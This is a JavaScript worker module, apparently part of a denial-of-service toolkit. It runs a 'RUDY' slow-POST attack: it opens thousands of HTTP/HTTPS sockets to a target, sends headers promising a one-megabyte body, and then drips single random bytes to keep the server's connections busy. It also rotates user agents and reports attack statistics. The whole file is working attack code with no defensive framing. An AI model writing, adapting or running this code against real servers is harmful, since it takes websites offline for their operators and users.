import tls from "tls";
import net from "net";
import { parentPort, workerData } from "worker_threads";
import { randomString } from "../utils/randomUtils.js";

const MAX_SOCKETS = 5000;
const SOCKETS_PER_BATCH = 100;
const BYTE_INTERVAL = 5000;
const CONNECTION_DELAY = 50;

const startAttack = () => {
  const { target, userAgents, duration } = workerData;

  const fixedTarget = target.startsWith("http") ? target : `https://${target}`;
  const isHttps = fixedTarget.startsWith("https");

  let targetHost = fixedTarget.replace(/^https?:\/\//, "").split("/")[0];
  let targetPort = isHttps ? 443 : 80;

  if (targetHost.includes(":")) {
    const [host, port] = targetHost.split(":");
    targetHost = host;
    targetPort = parseInt(port, 10);
  }

  console.log(`[RUDY] Target: ${targetHost}:${targetPort} (${isHttps ? "HTTPS" : "HTTP"})`);
  console.log(`[RUDY] Max: ${MAX_SOCKETS}, Batch: ${SOCKETS_PER_BATCH}, Delay: ${CONNECTION_DELAY}ms`);

  let totalPackets = 0;
  let successfulConnections = 0;
  let failedConnections = 0;
  let bytesSent = 0;
  const startTime = Date.now();
  const sockets = [];

  const createRudyConnection = (userAgent) => {
    const socket = isHttps
      ? tls.connect({ host: targetHost, port: targetPort, servername: targetHost, rejectUnauthorized: false })
      : net.connect({ host: targetHost, port: targetPort });

    socket.setNoDelay(true);
    socket.setTimeout(30000);

    let interval = null;
    const removeSocket = () => {
      if (interval) clearInterval(interval);
      const idx = sockets.indexOf(socket);
      if (idx > -1) sockets.splice(idx, 1);
      if (!socket.destroyed) socket.destroy();
    };

    socket.once("timeout", removeSocket);
    socket.once("error", () => { failedConnections++; removeSocket(); });
    socket.once("close", removeSocket);
    socket.once("end", removeSocket);

    socket.once(isHttps ? "secureConnect" : "connect", () => {
      const contentLength = 1000000;
      const headers =
        `POST /?${randomString(8)} HTTP/1.1\r\n` +
        `Host: ${targetHost}\r\n` +
        `User-Agent: ${userAgent}\r\n` +
        `Connection: keep-alive\r\n` +
        `Content-Type: application/x-www-form-urlencoded\r\n` +
        `Content-Length: ${contentLength}\r\n\r\n`;

      socket.write(headers);
      totalPackets++;
      successfulConnections++;
      sockets.push(socket);

      interval = setInterval(() => {
        if (socket && !socket.destroyed) {
          try {
            socket.write(randomString(1));
            bytesSent++;
            totalPackets++;
          } catch { removeSocket(); }
        } else {
          removeSocket();
        }
      }, BYTE_INTERVAL);
    });
  };

  const connectionInterval = setInterval(() => {
    const elapsed = (Date.now() - startTime) / 1000;

    if (elapsed >= duration) {
      clearInterval(connectionInterval);
      sockets.forEach((s) => s && !s.destroyed && s.destroy());

      const rate = successfulConnections + failedConnections > 0
        ? ((successfulConnections / (successfulConnections + failedConnections)) * 100).toFixed(1)
        : "0";

      parentPort.postMessage({
        log: `Complete - Active: ${sockets.length}, Success: ${successfulConnections}, Bytes: ${bytesSent}, Rate: ${rate}%`,
        totalPackets,
      });
      process.exit(0);
    }

    if (Math.floor(elapsed) % 3 === 0 && elapsed > 0) {
      parentPort.postMessage({
        log: `Active: ${sockets.length}/${MAX_SOCKETS} | Bytes: ${bytesSent} | Success: ${successfulConnections}`,
        totalPackets,
      });
    }

    const toCreate = Math.min(SOCKETS_PER_BATCH, MAX_SOCKETS - sockets.length);
    for (let i = 0; i < toCreate; i++) {
      const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
      createRudyConnection(userAgent);
    }
  }, CONNECTION_DELAY);
};

if (workerData) {
  startAttack();
}
